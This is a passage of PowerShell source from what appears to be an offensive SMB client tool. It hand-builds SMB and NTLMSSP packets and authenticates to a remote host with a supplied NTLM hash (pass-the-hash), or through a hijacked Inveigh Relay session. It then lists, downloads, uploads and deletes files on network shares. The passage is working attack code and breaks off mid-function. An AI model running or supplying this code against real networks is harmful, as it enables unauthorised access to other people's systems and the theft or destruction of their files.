    [Byte[]]$buffer_length = [System.BitConverter]::GetBytes($Buffer.Count)

    $SMB2SetInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SetInfoRequest.Add("StructureSize",[Byte[]](0x21,0x00))
    $SMB2SetInfoRequest.Add("InfoType",$InfoType)
    $SMB2SetInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2SetInfoRequest.Add("BufferLength",$buffer_length)
    $SMB2SetInfoRequest.Add("BufferOffset",[Byte[]](0x60,0x00))
    $SMB2SetInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2SetInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SetInfoRequest.Add("FileID",$FileID)
    $SMB2SetInfoRequest.Add("Buffer",$Buffer)

    return $SMB2SetInfoRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($Modify -and $Action -eq 'Put' -and $Source -isnot [Byte[]])
{
    $output_message = "[-] Source must be a byte array when using -Modify"
    $startup_error = $true
}
elseif((!$Modify -and $Source -isnot [String]) -or ($Modify -and $Action -ne 'Put' -and $Source -isnot [String]))
{
    $output_message = "[-] Source must be a string"
    $startup_error = $true
}
elseif($Source -is [String])
{
    $source = $Source.Replace('.\','')
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

}

$destination = $Destination.Replace('.\','')

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 30000
}

$action_step = 0

if($Action -ne 'Put')
{
    $source = $source.Replace('\\','')
    $source_array = $source.Split('\')
    $target = $source_array[0]
    $share = $source_array[1]
    $source_subdirectory_array = $source.ToCharArray()
    [Array]::Reverse($source_subdirectory_array)
    $source_file = -join($source_subdirectory_array)
    $source_file = $source_file.SubString(0,$source_file.IndexOf('\'))
    $source_file_array = $source_file.ToCharArray()
    [Array]::Reverse($source_file_array)
    $source_file = -join($source_file_array)
    $target_share = "\\$target\$share"
}

switch($Action)
{

    'Get'
    {

        if(!$Modify)
        {

            if($destination -and $destination -like '*\*')
            {
                $destination_file_array = $destination.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
                $destination_file_array = $destination_file.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_path = $destination
            }
            elseif($destination)
            {

                if(Test-Path (Join-Path $PWD $destination))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $destination
                }
               
            }
            else
            {

                if(Test-Path (Join-Path $PWD $source_file))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $source_file
                }

            }

        }
        else
        {
            $file_memory = New-Object System.Collections.ArrayList
        }

    }

    'Put'
    {

        if(!$Modify)
        {

            if($source -notlike '*\*')
            {
                $source = Join-Path $PWD $source
            }

            if(Test-Path $source)
            {
                [Int64]$source_file_size = (Get-Item $source).Length
                $source_file = $source

                if($source_file_size -gt 65536)
                {
                    $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                    $source_file_size_remainder = $source_file_size % 65536
                    $source_file_buffer_size = 65536
                }
                else
                {
                    $source_file_buffer_size = $source_file_size
                }

                $source_file_properties = Get-ItemProperty -path $source_file
                $source_file_creation_time = $source_file_properties.CreationTime.ToFileTime()
                $source_file_creation_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_creation_time))
                $source_file_creation_time = $source_file_creation_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_access_time = $source_file_properties.LastAccessTime.ToFileTime()
                $source_file_last_access_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_access_time))
                $source_file_last_access_time = $source_file_last_access_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_write_time = $source_file_properties.LastWriteTime.ToFileTime()
                $source_file_last_write_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_write_time))
                $source_file_last_write_time = $source_file_last_write_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_change_time = $source_file_last_write_time
                $source_file_buffer = new-object byte[] $source_file_buffer_size
                $source_file_stream = new-object IO.FileStream($source_file,[System.IO.FileMode]::Open)
                $source_file_binary_reader = new-object IO.BinaryReader($source_file_stream)
            }
            else
            {
                $output_message = "[-] File not found"
                $startup_error = $true
            }

        }
        else
        {

            [Int64]$source_file_size = $Source.Count

            if($source_file_size -gt 65536)
            {
                $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                $source_file_size_remainder = $source_file_size % 65536
                $source_file_buffer_size = 65536
            }
            else
            {
                $source_file_buffer_size = $source_file_size
            }
      
        }

        $destination = $destination.Replace('\\','')
        $destination_array = $destination.Split('\')
        $target = $destination_array[0]
        $share = $destination_array[1]
        $destination_file_array = $destination.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
        $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
        $destination_file_array = $destination_file.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
    }

}

if($Action -ne 'Put')
{

    if($source_array.Count -gt 2)
    {
        $share_subdirectory = $source.Substring($target.Length + $share.Length + 2)
    }

}
else
{
    
    if($destination_array.Count -gt 2)
    {
        $share_subdirectory = $destination.Substring($target.Length + $share.Length + 2)
    }

}

if($share_subdirectory -and $share_subdirectory.EndsWith('\'))
{
    $share_subdirectory = $share_subdirectory.Substring(0,$share_subdirectory.Length - 1)
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($target,"445")
    }
    catch
    {
        $output_message = "[-] $target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    
    $client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()
        $stage = 'NegotiateSMB'

        while($stage -ne 'exit')
        {

            try
            {
            
                switch ($stage)
                {

                    'NegotiateSMB'
                    {          
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00       
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                        {
                            $SMB_version = 'SMB1'
                            $stage = 'NTLMSSPNegotiate'

                            if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    Write-Verbose "[+] SMB signing is required"
                                    $SMB_signing = $true
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x15,0x82,0x08,0xa0
                                }

                            }
                            else
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is not required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    $SMB_signing = $false
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x05,0x82,0x08,0xa0
                                }

                            }

                        }
                        else
                        {
                            $stage = 'NegotiateSMB2'

                            if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    Write-Verbose "[+] SMB signing is required"
                                    $SMB_signing = $true
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x15,0x82,0x08,0xa0
                                }

                            }
                            else
                            {

                                if($SigningCheck)
                                {
                                    Write-Output "[+] SMB signing is not required"
                                    $stage = 'Exit'
                                }
                                else
                                {    
                                    $SMB_signing = $false
                                    $session_key_length = 0x00,0x00
                                    $negotiate_flags = 0x05,0x80,0x08,0xa0
                                }

                            }

                        }

                        Write-Verbose "[+] SMB version is $SMB_version"
                    }

                    'NegotiateSMB2'
                    {
                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $message_ID = 1
                        $packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'
                    }
                        
                    'NTLMSSPNegotiate'
                    { 
                        
                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                Write-Output "[-] $error_message"
            }

        }

        if(!$SigningCheck)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
            $auth_username_length = $auth_username_length[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
            $auth_hostname_length = $auth_hostname_length[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
            $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $SMB_session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        Write-Output "[-] SMB1 is not supported"
                        $login_successful = $false
                    }
                    else
                    {
                        Write-Output "[-] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[-] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                Write-Output "[-] $error_message"
                $login_successful = $false
            }

        }

    }

    try
    {

        if($login_successful -or $inveigh_session)
        {

            if($inveigh_session)
            {

                if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
                {
                    Write-Output "[*] Pausing due to Inveigh Relay session lock"
                    Start-Sleep -s 2
                }

                $inveigh.session_lock_table[$session] = 'locked'
                $client = $inveigh.session_socket_table[$session]
                $client_stream = $client.GetStream()
                $session_ID = $inveigh.session_table[$session]
                $message_ID =  $inveigh.session_message_ID_table[$session]
                $tree_ID = 0x00,0x00,0x00,0x00
                $SMB_signing = $false
            }

            $path = "\\" + $Target + "\IPC$"
            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
            $directory_list = New-Object System.Collections.ArrayList
            $stage = 'TreeConnect'

            while ($stage -ne 'Exit')
            {

                switch($stage)
                {
            
                    'CloseRequest'
                    {

                        if(!$SMB_file_ID)
                        {
                            $SMB_file_ID = $client_receive[132..147]
                        }

                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $SMB_file_ID = ''

                        if($directory_list.Count -gt 0 -and $Action -eq 'Recurse')
                        {
                            $file = $directory_list[0]
                            $root_directory = $file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'

                            if($root_directory.Count -gt 2)
                            {
                                $root_directory_extract = [System.BitConverter]::ToString($root_directory)
                                $root_directory_extract = $root_directory_extract -replace "-00",""

                                if($root_directory.Length -gt 2)
                                {
                                    $root_directory_extract = $root_directory_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $root_directory_string = New-Object System.String ($root_directory_extract,0,$root_directory_extract.Length)
                                }
                                else
                                {
                                    $root_directory_string = [Char][System.Convert]::ToInt16($file,16)
                                }

                            }

                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 1)
                        {

                            if($share_subdirectory -eq $source_file)
                            {
                                $file = ""
                            }
                            else
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                            }

                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            
                            switch($action_step)
                            {

                                0
                                {

                                    if($share_subdirectory -eq $source_file)
                                    {
                                        $file = ""
                                    }
                                    else
                                    {
                                        $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                                    }

                                    $create_request_extra_info = 1
                                    $stage = 'CreateRequest'
                                    $action_step++

                                }

                                1
                                {
                                    $stage = 'CreateRequestFindRequest'
                                }

                                3
                                {
                                    $stage = 'TreeDisconnect'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $share_subdirectory_start = $false
                            $stage = 'CreateRequestFindRequest'
                        }
                        else
                        {
                            $stage = 'TreeDisconnect'
                        }

                    }

                    'CreateRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file $create_request_extra_info $source_file_size

                        if($directory_list.Count -gt 0)
                        {
                            $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                            $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                        }
                        
                        if($Action -eq 'Delete')
                        {

                            switch($action_step)
                            {
                                
                                0
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x00,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                                2
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x40,0x00,0x20,0x00
